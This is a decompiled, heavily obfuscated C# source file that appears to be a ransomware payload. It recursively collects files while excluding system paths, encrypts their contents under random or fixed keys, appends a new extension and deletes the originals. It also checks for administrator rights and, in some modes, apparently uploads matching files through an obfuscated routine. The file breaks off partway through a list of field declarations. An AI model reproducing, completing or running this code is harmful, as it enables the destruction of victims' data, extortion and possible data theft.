using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using yedRdREuWKRqaRrYB;

namespace InTDhhOfzy;

internal sealed class atvFwvQCkKwzkN
{
	public sealed class TxPwKaoNbIG
	{
		private static StringCollection WVfbGgeQsONrnju;

		private static List<string> pKQluPiaRJJZ;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107410311));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107410306)) && !text.ToLower().Contains(getString_0(107409773)) && !text.ToLower().Contains(getString_0(107394370)) && !text.ToLower().Contains(getString_0(107394325)) && !text.ToLower().Contains(getString_0(107409760)) && !text.ToLower().Contains(getString_0(107394173)) && !text.ToLower().Contains(getString_0(107394658)) && !text.ToLower().Contains(getString_0(107394609)) && !text.ToLower().Contains(getString_0(107394624)) && !text.ToLower().Contains(getString_0(107394575)) && !text.ToLower().Contains(getString_0(107394573)) && !text.ToLower().Contains(getString_0(107394524)) && !text.ToLower().Contains(getString_0(107394539)) && !text.ToLower().Contains(getString_0(107394494)) && !text.ToLower().Contains(getString_0(107394505)) && !text.ToLower().Contains(getString_0(107394460)) && !text.ToLower().Contains(getString_0(107394447)) && !text.ToLower().Contains(getString_0(107394430)) && !text.ToLower().Contains(getString_0(107394445)) && !text.Contains(iWzroveCagNOUOgR(getString_0(107393884))) && !text.Contains(getString_0(107393891)) && !text.Contains(getString_0(107393861)) && !text.EndsWith(getString_0(107395348)) && !text.EndsWith(getString_0(107393836)) && !text.EndsWith(getString_0(107393831)) && !text.EndsWith(getString_0(107393826)) && !text.EndsWith(getString_0(107393789)) && !text.ToLower().Contains(getString_0(107393784)) && !text.ToLower().Contains(BreVYNEaqInZ))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(sdLJpoenlCvgq) * 1024.0 * 1024.0 && wTnoFuArjqi == getString_0(107396838))
							{
								pKQluPiaRJJZ.Add(text);
							}
							else if (File.Exists(text) && wTnoFuArjqi == getString_0(107396843))
							{
								pKQluPiaRJJZ.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return pKQluPiaRJJZ;
		}

		static TxPwKaoNbIG()
		{
			Strings.CreateGetStringDelegate(typeof(TxPwKaoNbIG));
			WVfbGgeQsONrnju = new StringCollection();
			pKQluPiaRJJZ = new List<string>();
		}
	}

	private sealed class gIrIlbMFNlsyg
	{
		public string lrOkHNFNlhOe;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == lrOkHNFNlhOe;
		}
	}

	private sealed class doJobctfrcIeix
	{
		private sealed class HmegWMnznQU
		{
			public doJobctfrcIeix qcMWOsfsjoEy;

			public string vbkvBCZYNpQiYmE;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					QFpuXDgdepZeKeP(WindowsIdentity.GetCurrent().Name, vbkvBCZYNpQiYmE);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				nzIsdWkCwoG(vbkvBCZYNpQiYmE, qcMWOsfsjoEy.FjntbyHzPJWPCXH, qcMWOsfsjoEy.lrPhBLDcOmetKP, qcMWOsfsjoEy.VWvWknLTtBRqVbqQs, qcMWOsfsjoEy.nEhqzQMXOdSrVS);
			}
		}

		public string[] FjntbyHzPJWPCXH;

		public string[] VWvWknLTtBRqVbqQs;

		public string nEhqzQMXOdSrVS;

		public string lrPhBLDcOmetKP;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			HmegWMnznQU CS_0024_003C_003E8__locals0 = new HmegWMnznQU();
			CS_0024_003C_003E8__locals0.qcMWOsfsjoEy = this;
			CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE = string_0;
			if (wdtSggURCxcnGd && !sTsovardsxZr().Contains(getString_0(107392918)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						QFpuXDgdepZeKeP(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wqnSIjxqtFtHR == getString_0(107396844))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					nzIsdWkCwoG(CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.FjntbyHzPJWPCXH, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.lrPhBLDcOmetKP, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.VWvWknLTtBRqVbqQs, CS_0024_003C_003E8__locals0.qcMWOsfsjoEy.nEhqzQMXOdSrVS);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				nzIsdWkCwoG(CS_0024_003C_003E8__locals0.vbkvBCZYNpQiYmE, FjntbyHzPJWPCXH, lrPhBLDcOmetKP, VWvWknLTtBRqVbqQs, nEhqzQMXOdSrVS);
			}
		}

		static doJobctfrcIeix()
		{
			Strings.CreateGetStringDelegate(typeof(doJobctfrcIeix));
		}
	}

	private sealed class ZDnnujygFIro
	{
		private sealed class POXpVhLAfqOU
		{
			public ZDnnujygFIro EtWqQmZystJoFY;

			public string RgqRyKjBqcnJkTi;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in PAVedODhIceUP)
				{
					if (RgqRyKjBqcnJkTi.ToLower().EndsWith(item + EtWqQmZystJoFY.GvpVQWXxwr) && izFJcfRSIdsTE == getString_0(107396855))
					{
						if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > new FileInfo(RgqRyKjBqcnJkTi).Length)
						{
							try
							{
								vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394779), getString_0(107394774), getString_0(107394729), RgqRyKjBqcnJkTi);
							}
							catch
							{
							}
						}
					}
					else if (RgqRyKjBqcnJkTi.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396860))
					{
						try
						{
							vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394779), getString_0(107394774), getString_0(107394729), RgqRyKjBqcnJkTi);
						}
						catch
						{
						}
					}
				}
			}

			static POXpVhLAfqOU()
			{
				Strings.CreateGetStringDelegate(typeof(POXpVhLAfqOU));
			}
		}

		private sealed class DNVsazavCjDamE
		{
			public ZDnnujygFIro EtWqQmZystJoFY;

			public string zludOANeWNA;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in PAVedODhIceUP)
				{
					if (zludOANeWNA.ToLower().EndsWith(item + EtWqQmZystJoFY.GvpVQWXxwr) && izFJcfRSIdsTE == getString_0(107396858))
					{
						if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > new FileInfo(zludOANeWNA).Length)
						{
							try
							{
								vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394782), getString_0(107394777), getString_0(107394732), zludOANeWNA);
							}
							catch
							{
							}
						}
					}
					else if (zludOANeWNA.ToLower().EndsWith(item) && izFJcfRSIdsTE == getString_0(107396863))
					{
						try
						{
							vYNZTwVhFOANy.EZWAhnqPwpiA(getString_0(107394782), getString_0(107394777), getString_0(107394732), zludOANeWNA);
						}
						catch
						{
						}
					}
				}
			}

			static DNVsazavCjDamE()
			{
				Strings.CreateGetStringDelegate(typeof(DNVsazavCjDamE));
			}
		}

		public List<string> UnWzrmFBdFhMI;

		public List<string> nDEsfoHIbnEr;

		public string GvpVQWXxwr;

		public string[] NIWowDVbTYCA;

		public string xlYLjVrSvCTxIOZJ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			POXpVhLAfqOU CS_0024_003C_003E8__locals0;
			foreach (string item in nDEsfoHIbnEr)
			{
				if (NIWowDVbTYCA.Length != 0)
				{
					string[] nIWowDVbTYCA = NIWowDVbTYCA;
					int num = 0;
					while (num < nIWowDVbTYCA.Length)
					{
						string value = nIWowDVbTYCA[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(GvpVQWXxwr))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || wxtQncBrNHcAfj.Contains(item))
				{
					continue;
				}
				if (quvSuKnnGqdfeN == getString_0(107396852))
				{
					try
					{
						if (PZhbxJwZchfW.HalIazfRaZcyQiM(item))
						{
							PZhbxJwZchfW.QfiHOoNTWnv(item);
						}
					}
					catch
					{
					}
				}
				wxtQncBrNHcAfj.Add(item);
				if (!MembHkBRQEG.Contains(Path.GetDirectoryName(item)))
				{
					MembHkBRQEG.Add(Path.GetDirectoryName(item));
				}
				wVfoevleVV(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (ySPgVCqYcWT)
						{
							try
							{
								File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + item + getString_0(107409725) + ex2.Message + getString_0(107396678));
							}
							catch (Exception)
							{
							}
						}
						aZPMuiXAvDSZE++;
						goto end_IL_00ee;
					}
					if (acYBptnuBPuI == getString_0(107396852) && new FileInfo(item).Length > Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024 && !UnWzrmFBdFhMI.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new POXpVhLAfqOU();
						CS_0024_003C_003E8__locals0.EtWqQmZystJoFY = this;
						try
						{
							if (GvpVQWXxwr != getString_0(107392296))
							{
								if (DiqbXqqefPkiW)
								{
									GvpVQWXxwr = NHtXqRcSpHaMt + GvpVQWXxwr;
								}
								File.Move(item, item + GvpVQWXxwr);
							}
						}
						catch (Exception ex4)
						{
							if (ySPgVCqYcWT)
							{
								try
								{
									File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + item + getString_0(107409664) + ex4.Message + getString_0(107396678));
								}
								catch (Exception)
								{
								}
							}
							aZPMuiXAvDSZE++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi = getString_0(107395175);
						if (GvpVQWXxwr != getString_0(107392296))
						{
							CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi = item + GvpVQWXxwr;
						}
						else
						{
							CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi = item;
						}
						if (OVQFJzgWysqwhUU == getString_0(107396852))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in PAVedODhIceUP)
								{
									if (CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EtWqQmZystJoFY.GvpVQWXxwr) && izFJcfRSIdsTE == POXpVhLAfqOU.getString_0(107396855))
									{
										if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi).Length)
										{
											try
											{
												vYNZTwVhFOANy.EZWAhnqPwpiA(POXpVhLAfqOU.getString_0(107394779), POXpVhLAfqOU.getString_0(107394774), POXpVhLAfqOU.getString_0(107394729), CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi.ToLower().EndsWith(item2) && izFJcfRSIdsTE == POXpVhLAfqOU.getString_0(107396860))
									{
										try
										{
											vYNZTwVhFOANy.EZWAhnqPwpiA(POXpVhLAfqOU.getString_0(107394779), POXpVhLAfqOU.getString_0(107394774), POXpVhLAfqOU.getString_0(107394729), CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
						string s = BAWbbIGcEbbh.BsLVCxQmQh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = qiylEdmqkDK.VfCZQwfOAj(CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi, Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024);
						qiylEdmqkDK.XLEQJcZPEMiXzygqu(FgaDtOZgltTEf: (!mvEARGpSInJD) ? (nXPdGXfAViu ? qiylEdmqkDK.eqCXDeuOFzjErU(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qiylEdmqkDK.eqCXDeuOFzjErU(byte_, Encoding.ASCII.GetBytes(xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nXPdGXfAViu ? uSVNzpcBrR.YOpbVsOnwFaxe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : uSVNzpcBrR.YOpbVsOnwFaxe(byte_, Encoding.ASCII.GetBytes(xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), idTFLyQZiFgNR: CS_0024_003C_003E8__locals0.RgqRyKjBqcnJkTi, eCvmaKFbLrK: bytes);
					}
					else
					{
						if (DiqbXqqefPkiW)
						{
							GvpVQWXxwr = NHtXqRcSpHaMt + GvpVQWXxwr;
						}
						string text2 = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
						string s2 = BAWbbIGcEbbh.BsLVCxQmQh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (GvpVQWXxwr != getString_0(107392296))
						{
							if (!krgzddxGYNU)
							{
								if (!nXPdGXfAViu)
								{
									TPDGCdwrJXWli(item, item + GvpVQWXxwr, CTCLDhOBQHDRqgI);
								}
								else
								{
									TPDGCdwrJXWli(item, item + GvpVQWXxwr, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!nXPdGXfAViu)
									{
										OCFRJwPDGkuTGlhs(item, item + GvpVQWXxwr, CTCLDhOBQHDRqgI);
									}
									else
									{
										OCFRJwPDGkuTGlhs(item, item + GvpVQWXxwr, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (ySPgVCqYcWT)
									{
										try
										{
											File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + item + getString_0(107392314) + ex6.Message + getString_0(107396678));
										}
										catch (Exception)
										{
										}
									}
									aZPMuiXAvDSZE++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!krgzddxGYNU)
						{
							if (!nXPdGXfAViu)
							{
								TPDGCdwrJXWli(item, item + getString_0(107392291), CTCLDhOBQHDRqgI);
							}
							else
							{
								TPDGCdwrJXWli(item, item + getString_0(107392291), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!nXPdGXfAViu)
								{
									OCFRJwPDGkuTGlhs(item, item, CTCLDhOBQHDRqgI);
								}
								else
								{
									OCFRJwPDGkuTGlhs(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (ySPgVCqYcWT)
								{
									try
									{
										File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + item + getString_0(107392314) + ex8.Message + getString_0(107396678));
									}
									catch (Exception)
									{
									}
								}
								aZPMuiXAvDSZE++;
								goto end_IL_00ee;
							}
						}
						if (nXPdGXfAViu)
						{
							if (GvpVQWXxwr != getString_0(107392296))
							{
								qJuIVZQcNrI(item + GvpVQWXxwr, bytes2);
							}
							else
							{
								qJuIVZQcNrI(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				nDEsfoHIbnEr.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			DNVsazavCjDamE CS_0024_003C_003E8__locals0 = new DNVsazavCjDamE();
			CS_0024_003C_003E8__locals0.EtWqQmZystJoFY = this;
			CS_0024_003C_003E8__locals0.zludOANeWNA = string_0;
			if (NIWowDVbTYCA.Length != 0)
			{
				string[] nIWowDVbTYCA = NIWowDVbTYCA;
				int num = 0;
				while (num < nIWowDVbTYCA.Length)
				{
					string value = nIWowDVbTYCA[num];
					if (!CS_0024_003C_003E8__locals0.zludOANeWNA.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.zludOANeWNA.EndsWith(GvpVQWXxwr))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!wxtQncBrNHcAfj.Contains(CS_0024_003C_003E8__locals0.zludOANeWNA))
			{
				if (quvSuKnnGqdfeN == getString_0(107396852))
				{
					try
					{
						if (PZhbxJwZchfW.HalIazfRaZcyQiM(CS_0024_003C_003E8__locals0.zludOANeWNA))
						{
							PZhbxJwZchfW.QfiHOoNTWnv(CS_0024_003C_003E8__locals0.zludOANeWNA);
						}
					}
					catch
					{
					}
				}
				wxtQncBrNHcAfj.Add(CS_0024_003C_003E8__locals0.zludOANeWNA);
				if (!MembHkBRQEG.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.zludOANeWNA)))
				{
					MembHkBRQEG.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.zludOANeWNA));
				}
				wVfoevleVV(CS_0024_003C_003E8__locals0.zludOANeWNA);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.zludOANeWNA).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (ySPgVCqYcWT)
						{
							try
							{
								File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + getString_0(107409725) + ex2.Message + getString_0(107396678));
							}
							catch (Exception)
							{
							}
						}
						aZPMuiXAvDSZE++;
						goto end_IL_0117_2;
					}
					if (acYBptnuBPuI == getString_0(107396852) && new FileInfo(CS_0024_003C_003E8__locals0.zludOANeWNA).Length > Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024)
					{
						try
						{
							if (GvpVQWXxwr != getString_0(107392296))
							{
								if (DiqbXqqefPkiW)
								{
									GvpVQWXxwr = NHtXqRcSpHaMt + GvpVQWXxwr;
								}
								File.Move(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + GvpVQWXxwr);
							}
						}
						catch (Exception ex4)
						{
							if (ySPgVCqYcWT)
							{
								try
								{
									File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + getString_0(107409664) + ex4.Message + getString_0(107396678));
								}
								catch (Exception)
								{
								}
							}
							aZPMuiXAvDSZE++;
							return;
						}
						if (GvpVQWXxwr != getString_0(107392296))
						{
							CS_0024_003C_003E8__locals0.zludOANeWNA += GvpVQWXxwr;
						}
						if (OVQFJzgWysqwhUU == getString_0(107396852))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in PAVedODhIceUP)
								{
									if (CS_0024_003C_003E8__locals0.zludOANeWNA.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.EtWqQmZystJoFY.GvpVQWXxwr) && izFJcfRSIdsTE == DNVsazavCjDamE.getString_0(107396858))
									{
										if (Convert.ToInt32(jXqLQoucvHzVUL) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.zludOANeWNA).Length)
										{
											try
											{
												vYNZTwVhFOANy.EZWAhnqPwpiA(DNVsazavCjDamE.getString_0(107394782), DNVsazavCjDamE.getString_0(107394777), DNVsazavCjDamE.getString_0(107394732), CS_0024_003C_003E8__locals0.zludOANeWNA);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.zludOANeWNA.ToLower().EndsWith(item) && izFJcfRSIdsTE == DNVsazavCjDamE.getString_0(107396863))
									{
										try
										{
											vYNZTwVhFOANy.EZWAhnqPwpiA(DNVsazavCjDamE.getString_0(107394782), DNVsazavCjDamE.getString_0(107394777), DNVsazavCjDamE.getString_0(107394732), CS_0024_003C_003E8__locals0.zludOANeWNA);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
						string s = BAWbbIGcEbbh.BsLVCxQmQh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = qiylEdmqkDK.VfCZQwfOAj(CS_0024_003C_003E8__locals0.zludOANeWNA, Convert.ToInt32(IaLlphSuwiBhw) * 1024 * 1024);
						qiylEdmqkDK.XLEQJcZPEMiXzygqu(FgaDtOZgltTEf: (!mvEARGpSInJD) ? (nXPdGXfAViu ? qiylEdmqkDK.eqCXDeuOFzjErU(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qiylEdmqkDK.eqCXDeuOFzjErU(byte_, Encoding.ASCII.GetBytes(xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (nXPdGXfAViu ? uSVNzpcBrR.YOpbVsOnwFaxe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : uSVNzpcBrR.YOpbVsOnwFaxe(byte_, Encoding.ASCII.GetBytes(xlYLjVrSvCTxIOZJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), idTFLyQZiFgNR: CS_0024_003C_003E8__locals0.zludOANeWNA, eCvmaKFbLrK: bytes);
					}
					else
					{
						if (DiqbXqqefPkiW)
						{
							GvpVQWXxwr = NHtXqRcSpHaMt + GvpVQWXxwr;
						}
						string text2 = UtAmjQduUxhP.JxvEpXggtdJEmYY(32);
						string s2 = BAWbbIGcEbbh.BsLVCxQmQh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (GvpVQWXxwr != getString_0(107392296))
						{
							if (!krgzddxGYNU)
							{
								if (!nXPdGXfAViu)
								{
									TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + GvpVQWXxwr, CTCLDhOBQHDRqgI);
								}
								else
								{
									TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + GvpVQWXxwr, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!nXPdGXfAViu)
									{
										OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + GvpVQWXxwr, CTCLDhOBQHDRqgI);
									}
									else
									{
										OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + GvpVQWXxwr, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (ySPgVCqYcWT)
									{
										try
										{
											File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + getString_0(107392314) + ex6.Message + getString_0(107396678));
										}
										catch (Exception)
										{
										}
									}
									aZPMuiXAvDSZE++;
									return;
								}
							}
						}
						else if (!krgzddxGYNU)
						{
							if (!nXPdGXfAViu)
							{
								TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + getString_0(107392291), CTCLDhOBQHDRqgI);
							}
							else
							{
								TPDGCdwrJXWli(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA + getString_0(107392291), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!nXPdGXfAViu)
								{
									OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA, CTCLDhOBQHDRqgI);
								}
								else
								{
									OCFRJwPDGkuTGlhs(CS_0024_003C_003E8__locals0.zludOANeWNA, CS_0024_003C_003E8__locals0.zludOANeWNA, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (ySPgVCqYcWT)
								{
									try
									{
										File.AppendAllText(NarcQCMbbNaqtU, getString_0(107393060) + CS_0024_003C_003E8__locals0.zludOANeWNA + getString_0(107392314) + ex8.Message + getString_0(107396678));
									}
									catch (Exception)
									{
									}
								}
								aZPMuiXAvDSZE++;
								return;
							}
						}
						if (nXPdGXfAViu)
						{
							if (GvpVQWXxwr != getString_0(107392296))
							{
								qJuIVZQcNrI(CS_0024_003C_003E8__locals0.zludOANeWNA + GvpVQWXxwr, bytes2);
							}
							else
							{
								qJuIVZQcNrI(CS_0024_003C_003E8__locals0.zludOANeWNA, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			nDEsfoHIbnEr.Remove(CS_0024_003C_003E8__locals0.zludOANeWNA);
		}

		static ZDnnujygFIro()
		{
			Strings.CreateGetStringDelegate(typeof(ZDnnujygFIro));
		}
	}

	private sealed class AmBvdoDqdIwyaKw
	{
		public string lLaxVxomDLNRz;

		public string eoxUrRKXuGW;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(lLaxVxomDLNRz);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(eoxUrRKXuGW))
					{
						File.Delete(eoxUrRKXuGW);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string VHsLiUKFfidwWXR;

	public static byte[] CTCLDhOBQHDRqgI;

	public static string wTnoFuArjqi;

	public static string sdLJpoenlCvgq;

	public static List<string> lXkxRPeRNZ;

	public static List<string> KOdpTUTkhTTKgck;

	public static string imBstcBDQISzV;

	public static string xlYLjVrSvCTxIOZJ;

	public static string sSCSYzLRGQ;

	public static string cMOYTgWgGzGu;

	public static int HttjUNgZVMdF;

	public static string quvSuKnnGqdfeN;

	public static string tkOWDxFxUWicNm;

	public static string FbrxAxGStlnzYU;

	public static string JTRTIuEOTvuh;

	public static string isMcXCRePGXWj;

	public static string pnTyIVzOwj;

	public static string xbWzJPCNNlGDGm;

	public static string mqdGbQaLPms;

	public static List<string> BlKPvBRBvxfSTW;

	public static List<string> MembHkBRQEG;

	public static string JaKxooYLUGf;

	public static string horNorVByMaUksf;

	public static string sGjvlsQPGLsZQ;

	public static List<string> wxtQncBrNHcAfj;

	public static string ZznCoKAHwMURezBPhT;

	private static string mgPKyvtQeNO;

	public static string wqnSIjxqtFtHR;

	public static string dYzKVbNCMPY;

	public static List<string> XXTcJnsSin;

	public static List<string> IHpJZCadsoQtVF;

	public static List<string> EuyTUVwaghbjWq;

	public static List<string> YxhEsnxKVPVIG;

	public static string abdHCeUGVK;

	public static List<string> mTjzKFABFlRPD;

	public static List<string> iSBgDeZeUJkg;

	public static string nFxEalhYYCjpL;

	public static string CZjeZpoOaBnWY;

	internal static DateTime fgPtuXEkZLaHJD;

	internal static DateTime YAumgqZlOtmhY;

	public static string acYBptnuBPuI;

	public static string IaLlphSuwiBhw;

	public static string CnIdBEsRRFvc;

	public static string QRAVrNWYboLLkW;

	public static string nmnOVCJgTpDc;

	public static string vDPjztkQJXZ;

	public static string RFlzVSEmhVRu;

	public static string OVQFJzgWysqwhUU;

	public static List<string> PAVedODhIceUP;

	public static string izFJcfRSIdsTE;

	public static string jXqLQoucvHzVUL;

	public static string kgKCLKpybxy;

	public static string DxLtCSnkczui;

	public static string JpnrHsWYSseT;

	public static string MSnaZcaVNlKnHeD;

	public static string CQdUFfqZbG;

	public static string sqKGSbKKNklysTXUM;

	public static string tzzfSLPHYSUvx;

	public static string oOHJagQRGgL;

	public static string qgrrwNVhThZQ;

	public static string eIuqMMBRyBNjhwm;

	public static string MuPMQecWyntAc;

	public static string sbRMnDSlEApwJ;

	public static string TlTdnQphJLOy;

	public static string SMxIgRfclz;

	public static string QZsBHkBpjECwVs;

	public static string jDiJDMgRCgs;

	public static string KEvGjNNtOiZocQ;

	public static string BreVYNEaqInZ;

	public static string VMaIlgsPdNUXjXpk;

	public static string JUOcohxOPRCTwG;
